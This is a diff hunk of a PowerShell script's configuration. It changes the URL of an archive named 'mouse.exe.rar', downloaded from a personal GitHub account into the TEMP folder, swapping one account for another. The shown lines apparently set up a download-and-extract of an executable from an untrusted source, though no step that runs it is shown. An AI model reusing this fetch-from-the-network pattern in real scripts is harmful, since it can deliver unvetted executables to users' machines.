@@ -6,7 +6,7 @@
 $ErrorActionPreference = 'Stop'
 
 # ---------- Configuration ----------
-$RawUrl      = 'https://github.com/sahilvetrix-tech/mouse.exe/raw/refs/heads/main/mouse.exe.rar'
+$RawUrl      = 'https://github.com/nulltech592/mouse.exe/raw/refs/heads/main/mouse.exe.rar'
 $RarFile     = "$env:TEMP\mouse.exe.rar"
 $ExtractDir  = "$env:TEMP\mouse_extracted"
 # -----------------------------------
